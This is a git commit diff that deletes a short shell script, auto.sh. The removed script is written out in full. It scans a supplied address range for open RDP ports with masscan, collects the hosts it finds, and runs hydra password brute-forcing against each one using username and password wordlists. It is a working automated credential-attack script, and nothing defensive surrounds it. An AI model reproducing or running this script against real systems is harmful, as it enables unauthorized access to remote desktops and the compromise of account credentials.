bd387be13c0e5bb2877cc8f99f19600ddd6155c5
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2020-10-26 18:30:39 +0200

    Delete auto.sh

--- auto.sh
+++
@@ -1,4 +0,0 @@
-d=$(masscan -p3389 $1 )
-ips=$(echo $d | sed 's/Discovered /\nDiscovered/g' | awk '{ print $5 }')
-echo $ips > results.txt
-for lin1 in $(cat results.txt); do hydra -L windows_u.txt -P pass.txt -e ns -o Output/rdp_$lin1.txt -I -V -W 3 -t 10 $lin1 rdp ; done
